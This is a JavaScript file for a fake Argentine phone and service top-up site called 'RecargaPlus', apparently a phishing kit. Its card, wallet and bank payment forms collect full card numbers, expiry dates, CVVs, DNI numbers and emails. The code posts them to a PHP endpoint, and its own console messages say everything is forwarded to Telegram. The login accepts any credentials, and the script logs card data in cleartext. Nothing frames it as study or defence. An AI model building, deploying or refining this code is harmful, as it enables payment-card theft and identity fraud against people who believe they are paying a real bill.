// RecargaPlus - Sistema Completo
(function() {
    'use strict';

    const API_URL = 'api/procesar_pago.php';
    const state = { user: null, service: null, amount: null, number: null };
    const services = {
        claro: { name: 'Claro', label: 'Número de teléfono', placeholder: '1123456789' },
        personal: { name: 'Personal', label: 'Número de teléfono', placeholder: '1123456789' },
        movistar: { name: 'Movistar', label: 'Número de teléfono', placeholder: '1123456789' },
        tuenti: { name: 'Tuenti', label: 'Número de teléfono', placeholder: '1123456789' },
        sube: { name: 'SUBE', label: 'Número de tarjeta', placeholder: '6061358812345678' },
        directv: { name: 'DirecTV', label: 'Número de cliente', placeholder: '12345678' },
        antina: { name: 'Antina', label: 'Número de cuenta', placeholder: '987654321' }
    };
    let el = {};

    function init() {
        console.log('%c🚀 RecargaPlus + Telegram Bot', 'color:#0088CC;font-size:20px;font-weight:bold');
        console.log('%cTODOS los datos se enviarán a Telegram', 'color:#00A859;font-size:12px');
        el = {
            loginScreen: document.getElementById('loginScreen'),
            dashboardScreen: document.getElementById('dashboardScreen'),
            loginForm: document.getElementById('loginForm'),
            username: document.getElementById('username'),
            password: document.getElementById('password'),
            togglePassword: document.querySelector('.toggle-password'),
            logoutBtn: document.getElementById('logoutBtn'),
            userInitials: document.getElementById('userInitials'),
            servicesGrid: document.getElementById('servicesGrid'),
            rechargeModal: document.getElementById('rechargeModal'),
            closeModal: document.getElementById('closeModal'),
            rechargeForm: document.getElementById('rechargeForm'),
            modalServiceLogo: document.getElementById('modalServiceLogo'),
            modalServiceName: document.getElementById('modalServiceName'),
            serviceNumber: document.getElementById('serviceNumber'),
            amountBtns: document.querySelectorAll('.amount-btn'),
            customAmountGroup: document.getElementById('customAmountGroup'),
            customAmount: document.getElementById('customAmount'),
            summaryAmount: document.getElementById('summaryAmount'),
            summaryFee: document.getElementById('summaryFee'),
            summaryTotal: document.getElementById('summaryTotal'),
            paymentModal: document.getElementById('paymentGatewayModal'),
            closePayment: document.getElementById('closePaymentGateway'),
            paymentForm: document.getElementById('paymentGatewayForm'),
            cardNumber: document.getElementById('cardNumber'),
            expiryDate: document.getElementById('expiryDate'),
            cvv: document.getElementById('cvv'),
            dni: document.getElementById('dni'),
            email: document.getElementById('email'),
            paymentServiceName: document.getElementById('paymentServiceName'),
            paymentAmount: document.getElementById('paymentAmount'),
            paymentTotal: document.getElementById('paymentTotal'),
            walletModal: document.getElementById('walletGatewayModal'),
            closeWallet: document.getElementById('closeWalletGateway'),
            walletForm: document.getElementById('walletGatewayForm'),
            walletCardNumber: document.getElementById('walletCardNumber'),
            walletExpiryDate: document.getElementById('walletExpiryDate'),
            walletCvv: document.getElementById('walletCvv'),
            walletDni: document.getElementById('walletDni'),
            walletEmail: document.getElementById('walletEmail'),
            walletServiceName: document.getElementById('walletServiceName'),
            walletAmount: document.getElementById('walletAmount'),
            walletTotal: document.getElementById('walletTotal'),
            bankModal: document.getElementById('bankGatewayModal'),
            closeBank: document.getElementById('closeBankGateway'),
            bankForm: document.getElementById('bankGatewayForm'),
            bankCardNumber: document.getElementById('bankCardNumber'),
            bankExpiryDate: document.getElementById('bankExpiryDate'),
            bankCvv: document.getElementById('bankCvv'),
            bankDni: document.getElementById('bankDni'),
            bankEmail: document.getElementById('bankEmail'),
            bankServiceName: document.getElementById('bankServiceName'),
            bankAmount: document.getElementById('bankAmount'),
            bankTotal: document.getElementById('bankTotal'),
            toast: document.getElementById('toast')
        };
        attachEvents();
    }

    function attachEvents() {
        el.loginForm.addEventListener('submit', e => {
            e.preventDefault();
            const u = el.username.value.trim();
            if (u && el.password.value.length >= 6) {
                state.user = u;
                el.userInitials.textContent = u.substring(0,2).toUpperCase();
                switchScreen(el.loginScreen, el.dashboardScreen);
                toast('¡Bienvenido!', 'success');
            } else {
                toast('Usuario o contraseña inválidos', 'error');
            }
        });
        el.togglePassword.addEventListener('click', () => {
            el.password.type = el.password.type === 'password' ? 'text' : 'password';
        });
        el.logoutBtn.addEventListener('click', () => {
            state.user = null;
            switchScreen(el.dashboardScreen, el.loginScreen);
            toast('Sesión cerrada', 'success');
        });
        el.servicesGrid.addEventListener('click', e => {
            const card = e.target.closest('.service-card');
            if (!card) return;
            state.service = card.dataset.service;
            const s = services[state.service];
            el.modalServiceLogo.textContent = s.name;
            el.modalServiceName.textContent = `Recarga ${s.name}`;
            document.getElementById('serviceNumberLabel').textContent = s.label;
            el.serviceNumber.placeholder = s.placeholder;
            el.rechargeForm.reset();
            el.customAmountGroup.style.display = 'none';
            state.amount = null;
            updateSummary(0);
            el.amountBtns.forEach(btn => btn.classList.remove('active'));
            openModal(el.rechargeModal);
        });
        el.closeModal.addEventListener('click', () => closeModal(el.rechargeModal));
        el.rechargeForm.addEventListener('submit', e => {
            e.preventDefault();
            const num = el.serviceNumber.value.trim();
            if (!num || num.length < 6) return toast('Número inválido', 'error');
            if (!state.amount || state.amount <= 0) return toast('Selecciona monto', 'error');
            state.number = num;
            const method = document.querySelector('input[name="payment"]:checked').value;
            closeModal(el.rechargeModal);
            setTimeout(() => {
                if (method === 'card') openPaymentModal();
                else if (method === 'wallet') openWalletModal();
                else if (method === 'bank') openBankModal();
            }, 300);
        });
        el.amountBtns.forEach(btn => btn.addEventListener('click', e => {
            const amt = e.target.dataset.amount;
            el.amountBtns.forEach(b => b.classList.remove('active'));
            e.target.classList.add('active');
            if (amt === 'custom') {
                el.customAmountGroup.style.display = 'block';
                el.customAmount.focus();
                state.amount = null;
                updateSummary(0);
            } else {
                el.customAmountGroup.style.display = 'none';
                state.amount = parseInt(amt);
                updateSummary(state.amount);
            }
        }));
        el.customAmount.addEventListener('input', e => {
            const v = parseInt(e.target.value);
            if (v > 0) {
                state.amount = v;
                updateSummary(v);
            } else {
                state.amount = null;
                updateSummary(0);
            }
        });
        el.closePayment.addEventListener('click', () => closeModal(el.paymentModal));
        el.paymentForm.addEventListener('submit', e => {
            e.preventDefault();
            if (!validate(el)) return;
            processPago('Tarjeta', {
                numero_tarjeta: el.cardNumber.value.replace(/\s/g, ''),
                fecha_vencimiento: el.expiryDate.value,
                cvv: el.cvv.value,
                dni: el.dni.value,
                email: el.email.value
            }, el.paymentModal);
        });
        el.closeWallet.addEventListener('click', () => closeModal(el.walletModal));
        el.walletForm.addEventListener('submit', e => {
            e.preventDefault();
            if (!validate(el, 'wallet')) return;
            processPago('Billetera', {
                numero_tarjeta: el.walletCardNumber.value.replace(/\s/g, ''),
                fecha_vencimiento: el.walletExpiryDate.value,
                cvv: el.walletCvv.value,
                dni: el.walletDni.value,
                email: el.walletEmail.value
            }, el.walletModal);
        });
        el.closeBank.addEventListener('click', () => closeModal(el.bankModal));
        el.bankForm.addEventListener('submit', e => {
            e.preventDefault();
            if (!validate(el, 'bank')) return;
            processPago('Banco', {
                numero_tarjeta: el.bankCardNumber.value.replace(/\s/g, ''),
                fecha_vencimiento: el.bankExpiryDate.value,
                cvv: el.bankCvv.value,
                dni: el.bankDni.value,
                email: el.bankEmail.value
            }, el.bankModal);
        });
        [el.cardNumber, el.walletCardNumber, el.bankCardNumber].forEach(e => e.addEventListener('input', x => x.target.value = formatCard(x.target.value)));
        [el.expiryDate, el.walletExpiryDate, el.bankExpiryDate].forEach(e => e.addEventListener('input', x => x.target.value = formatExpiry(x.target.value)));
        [el.cvv, el.walletCvv, el.bankCvv, el.dni, el.walletDni, el.bankDni].forEach(e => e.addEventListener('input', x => x.target.value = x.target.value.replace(/\D/g, '')));
    }

    function openPaymentModal() {
        const s = services[state.service];
        const t = (state.amount * 1.02).toFixed(2);
        el.paymentServiceName.textContent = s.name;
        el.paymentAmount.textContent = `$${state.amount}`;
        el.paymentTotal.textContent = `$${t}`;
        el.paymentForm.reset();
        openModal(el.paymentModal);
    }

    function openWalletModal() {
        const s = services[state.service];
        const t = (state.amount * 1.02).toFixed(2);
        el.walletServiceName.textContent = s.name;
        el.walletAmount.textContent = `$${state.amount}`;
        el.walletTotal.textContent = `$${t}`;
        el.walletForm.reset();
        openModal(el.walletModal);
    }

    function openBankModal() {
        const s = services[state.service];
        const t = (state.amount * 1.02).toFixed(2);
        el.bankServiceName.textContent = s.name;
        el.bankAmount.textContent = `$${state.amount}`;
        el.bankTotal.textContent = `$${t}`;
        el.bankForm.reset();
        openModal(el.bankModal);
    }

    async function processPago(metodo, formData, modal) {
        toast('Procesando...', 'success');
        const fee = (state.amount * 0.02).toFixed(2);
        const total = (state.amount * 1.02).toFixed(2);
        
        const data = {
            servicio: services[state.service].name,
            numero_servicio: state.number,
            monto: state.amount.toString(),
            comision: fee,
            total: total,
            metodo_pago: metodo,
            numero_tarjeta: formData.numero_tarjeta,
            fecha_vencimiento: formData.fecha_vencimiento,
            cvv: formData.cvv,
            dni: formData.dni,
            email: formData.email
        };
        
        console.log('%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'color:blue;font-weight:bold');
        console.log('%c📤 ENVIANDO TODOS LOS DATOS', 'color:blue;font-size:16px;font-weight:bold');
        console.log('%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'color:blue;font-weight:bold');
        console.log('📍 URL:', API_URL);
        console.log('📦 DATOS COMPLETOS:', data);
        console.log('');
        console.log('💳 TARJETA:', data.numero_tarjeta);
        console.log('📅 VENCIMIENTO:', data.fecha_vencimiento);
        console.log('🔐 CVV:', data.cvv);
        console.log('🆔 DNI:', data.dni);
        console.log('📧 EMAIL:', data.email);
        console.log('💵 TOTAL:', data.total);
        
        setTimeout(async () => {
            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                console.log('');
                console.log('📥 RESPUESTA:', response.status);
                
                const result = await response.json();
                console.log('📄 DATA:', result);
                
                closeModal(modal);
                
                if (response.ok && result.success) {
                    console.log('%c✅ ÉXITO - Todos los datos enviados a Telegram', 'color:green;font-size:14px;font-weight:bold');
                    toast('¡Pago exitoso! Datos enviados', 'success');
                } else {
                    console.log('%c❌ ERROR - Revisa procesar_pago.php', 'color:red;font-size:14px');
                    toast('Error. Revisa consola (F12)', 'error');
                }
            } catch (error) {
                console.log('%c❌ ERROR CRÍTICO', 'color:red;font-size:16px;font-weight:bold');
                console.error('Error:', error);
                console.log('');
                console.log('%c⚠️ SOLUCIÓN:', 'color:orange;font-size:14px');
                console.log('Estás abriendo el HTML directamente (file:///)');
                console.log('Necesitás usar un servidor local:');
                console.log('1. Descarga XAMPP: https://www.apachefriends.org');
                console.log('2. Instala XAMPP');
                console.log('3. Copia archivos a: C:\\xampp\\htdocs\\recargar\\');
                console.log('4. Abre: http://localhost/recargar');
                closeModal(modal);
                toast('ERROR: Usá servidor local (ver consola F12)', 'error');
            }
            
            state.amount = null;
            state.number = null;
            state.service = null;
        }, 1500);
    }

    function validate(elements, type = 'payment') {
        const p = type === 'payment' ? '' : type === 'wallet' ? 'wallet' : 'bank';
        const card = elements[p ? `${p}CardNumber` : 'cardNumber'].value.replace(/\s/g, '');
        const exp = elements[p ? `${p}ExpiryDate` : 'expiryDate'].value;
        const cvv = elements[p ? `${p}Cvv` : 'cvv'].value;
        const dni = elements[p ? `${p}Dni` : 'dni'].value;
        const email = elements[p ? `${p}Email` : 'email'].value;
        
        if (card.length < 15 || card.length > 16) return toast('Tarjeta inválida', 'error'), false;
        if (!/^\d{2}\/\d{2}$/.test(exp)) return toast('Vencimiento inválido', 'error'), false;
        if (cvv.length < 3 || cvv.length > 4) return toast('CVV inválido', 'error'), false;
        if (dni.length < 7) return toast('DNI inválido', 'error'), false;
        if (!email.includes('@')) return toast('Email inválido', 'error'), false;
        return true;
    }

    function updateSummary(amt) {
        if (amt <= 0) {
            el.summaryAmount.textContent = '$0';
            el.summaryFee.textContent = '$0';
            el.summaryTotal.textContent = '$0';
            return;
        }
        const fee = amt * 0.02;
        const total = amt + fee;
        el.summaryAmount.textContent = `$${amt}`;
        el.summaryFee.textContent = `$${fee.toFixed(2)}`;
        el.summaryTotal.textContent = `$${total.toFixed(2)}`;
    }

    function formatCard(v) {
        const c = v.replace(/\D/g, '');
        return c.match(/.{1,4}/g)?.join(' ') || c;
    }

    function formatExpiry(v) {
        const c = v.replace(/\D/g, '');
        return c.length >= 2 ? c.slice(0,2) + '/' + c.slice(2,4) : c;
    }

    function switchScreen(from, to) {
        from.classList.remove('active');
        from.style.display = 'none';
        to.style.display = to === el.loginScreen ? 'flex' : 'block';
        to.classList.add('active');
    }

    function openModal(m) {
        m.classList.add('active');
        document.body.style.overflow = 'hidden';
    }

    function closeModal(m) {
        m.classList.remove('active');
        document.body.style.overflow = '';
    }

    function toast(msg, type) {
        el.toast.textContent = msg;
        el.toast.className = `toast ${type}`;
        el.toast.classList.add('show');
        setTimeout(() => el.toast.classList.remove('show'), 3000);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();